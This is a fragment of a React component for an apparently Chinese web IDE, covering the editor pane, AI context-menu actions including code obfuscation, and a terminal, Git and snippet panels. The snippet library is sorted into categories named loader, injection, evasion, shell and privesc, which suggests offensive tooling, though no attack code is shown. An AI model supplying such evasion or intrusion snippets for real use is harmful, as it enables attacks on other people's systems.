                      <button onClick={(e) => closeTab(tabId, e)} className="w-3.5 h-3.5 rounded-sm hover:bg-white/20 flex items-center justify-center opacity-0 group-hover:opacity-100 transition-opacity">
                        <X className="w-2.5 h-2.5" />
                      </button>
                    </div>
                  );
                })
              )}
              <button onClick={() => toast.info("新建文件即将上线")} className="px-2 py-2 text-[var(--sidebar-fg)] hover:text-white transition-colors shrink-0">
                <Plus className="w-3.5 h-3.5" />
              </button>
            </div>

            <ResizablePanelGroup direction="vertical" className="flex-1">
              <ResizablePanel defaultSize={showTerminal ? 65 : 100}>
                {activeTab && activeFile ? (
                  <ContextMenu>
                    <ContextMenuTrigger className="h-full block">
                      <Editor
                        height="100%"
                        language={activeFile.language ?? "go"}
                        value={fileContents[activeTab] ?? activeFile.content}
                        onChange={(val) => setFileContents(prev => ({ ...prev, [activeTab]: val ?? "" }))}
                        onMount={handleEditorMount}
                        options={{
                          fontSize: 13,
                          fontFamily: "'JetBrains Mono', 'Fira Code', monospace",
                          fontLigatures: true,
                          minimap: { enabled: true, scale: 1 },
                          lineNumbers: "on",
                          scrollBeyondLastLine: false,
                          wordWrap: "off",
                          tabSize: 4,
                          bracketPairColorization: { enabled: true },
                          smoothScrolling: true,
                          cursorBlinking: "phase",
                          padding: { top: 12, bottom: 12 },
                          quickSuggestions: false,
                        }}
                      />
                    </ContextMenuTrigger>
                    <ContextMenuContent className="text-xs w-52">
                      <ContextMenuSub>
                        <ContextMenuSubTrigger className="gap-2"><Bot className="w-3.5 h-3.5 text-purple-500" /> AI 操作</ContextMenuSubTrigger>
                        <ContextMenuSubContent>
                          {[{ label: "解释代码", op: "explain" as const }, { label: "重写代码", op: "rewrite" as const }, { label: "混淆代码", op: "obfuscate" as const }, { label: "反混淆", op: "deobfuscate" as const }, { label: "安全审计", op: "audit" as const }].map(item => (
                            <ContextMenuItem key={item.op} onClick={() => handleAiOperation(item.op)}>
                              <Bot className="w-3.5 h-3.5 mr-2 text-purple-500" />{item.label}
                            </ContextMenuItem>
                          ))}
                        </ContextMenuSubContent>
                      </ContextMenuSub>
                      <ContextMenuSeparator />
                      <ContextMenuItem onClick={() => { setAssistantContext({ fileContent: fileContents[activeTab], fileName: activeFile?.name }); setActiveModule("assistant"); }}>
                        <Bot className="w-3.5 h-3.5 mr-2" /> 发送到 AI 助手
                      </ContextMenuItem>
                      <ContextMenuItem onClick={() => { navigator.clipboard.writeText(fileContents[activeTab] ?? ""); toast.success("已复制"); }}>
                        <Copy className="w-3.5 h-3.5 mr-2" /> 复制全部
                      </ContextMenuItem>
                    </ContextMenuContent>
                  </ContextMenu>
                ) : (
                  <div className="h-full flex flex-col items-center justify-center text-center bg-[var(--editor-bg)]">
                    <FolderOpen className="w-12 h-12 text-[var(--sidebar-section)] mb-3" />
                    <p className="text-sm text-[var(--sidebar-fg)]">选择文件开始编辑</p>
                    <p className="text-xs text-[var(--sidebar-section)] mt-1">点击左侧文件树中的文件</p>
                  </div>
                )}
              </ResizablePanel>

              {showTerminal && (
                <>
                  <ResizableHandle className="bg-[var(--editor-border)] h-px" />
                  <ResizablePanel defaultSize={35} minSize={20}>
                    <TerminalPanel visible={showTerminal} projectName={currentProject.name} />
                  </ResizablePanel>
                </>
              )}
            </ResizablePanelGroup>
          </div>
        </ResizablePanel>

        {/* Snippets Panel */}
        {showSnippets && (
          <>
            <ResizableHandle className="bg-[var(--editor-border)] w-px" />
            <ResizablePanel defaultSize={20} minSize={15} maxSize={28}>
              <div className="h-full flex flex-col bg-[#0d0e1a] border-l border-[var(--editor-border)]">
                <div className="flex items-center justify-between px-3 py-2 border-b border-[var(--editor-border)] shrink-0">
                  <span className="text-[9px] text-[var(--sidebar-section)] uppercase tracking-[0.15em] font-bold">代码片段库</span>
                  <Button variant="ghost" size="icon" className="w-5 h-5 text-[var(--sidebar-fg)]" onClick={() => setShowSnippets(false)}><X className="w-3 h-3" /></Button>
                </div>
                <div className="flex gap-1 p-1.5 border-b border-[var(--editor-border)] flex-wrap">
                  {["all", "loader", "injection", "evasion", "shell", "privesc"].map(cat => (
                    <button key={cat} onClick={() => setSnippetCategory(cat)}
                      className={cn("text-[9px] px-1.5 py-0.5 rounded font-medium transition-colors",
                        snippetCategory === cat ? "bg-[var(--primary)] text-white" : "text-[var(--sidebar-fg)] hover:bg-[var(--sidebar-hover)]"
                      )}>
                      {cat === "all" ? "全部" : cat}
                    </button>
                  ))}
                </div>
                <ScrollArea className="flex-1">
                  <div className="p-1.5 space-y-1.5">
                    {filteredSnippets.map((snippet, i) => (
                      <div key={i} className="rounded-xl border border-[var(--editor-border)] overflow-hidden cursor-pointer hover:border-[var(--primary)] transition-all group"
                        onClick={() => {
                          if (editorRef.current && activeTab) {
                            const editor = editorRef.current;
                            editor.executeEdits("snippet", [{ range: editor.getSelection(), text: snippet.code }]);
                            toast.success(`已插入: ${snippet.name}`);
                          }
                        }}>
                        <div className="flex items-center justify-between px-2 py-1.5 bg-[var(--editor-line)]">
                          <span className="text-[10px] text-white font-semibold truncate">{snippet.name}</span>
                          <Badge className="text-[9px] h-3.5 px-1 bg-[var(--primary)] text-white shrink-0">{snippet.lang}</Badge>
                        </div>
                        <pre className="text-[9px] text-[var(--sidebar-fg)] p-2 overflow-hidden max-h-14 leading-4">{snippet.code.slice(0, 100)}...</pre>
                      </div>
                    ))}
                  </div>
                </ScrollArea>
              </div>
            </ResizablePanel>
          </>
        )}

        {/* Git Panel */}
        {showGit && (
          <>
            <ResizableHandle className="bg-[var(--editor-border)] w-px" />
            <ResizablePanel defaultSize={18} minSize={14} maxSize={28}>
              <GitPanel visible={showGit} />
            </ResizablePanel>
          </>
        )}
      </ResizablePanelGroup>

      {/* Status Bar */}
      <div className="flex items-center gap-4 px-3 py-1 bg-[var(--primary)] text-white text-[10px] shrink-0">
        <span className="flex items-center gap-1"><FolderOpen className="w-3 h-3" />{currentProject.name}</span>
        <span className="flex items-center gap-1"><GitBranch className="w-3 h-3" />main</span>
        <span className="font-mono">{activeFile?.language?.toUpperCase() ?? "—"}</span>
        <span>UTF-8 · LF</span>
        <span className="flex items-center gap-1">
          <Sparkles className={cn("w-3 h-3", aiEnabled ? "text-purple-300" : "opacity-40")} />
          AI 补全 {aiEnabled ? "ON" : "OFF"}
        </span>
        {(aiLoading || completionLoading) && (
          <span className="flex items-center gap-1 ml-auto"><RefreshCw className="w-3 h-3 animate-spin" />AI 处理中...</span>
        )}
        {ghostText && !aiLoading && (
          <span className="flex items-center gap-1 ml-auto text-purple-200"><Sparkles className="w-3 h-3" />Tab 接受补全</span>
        )}
        <span className="ml-auto text-white/70">{activeFile?.name ?? "无文件"}</span>
      </div>
    </div>
  );
}
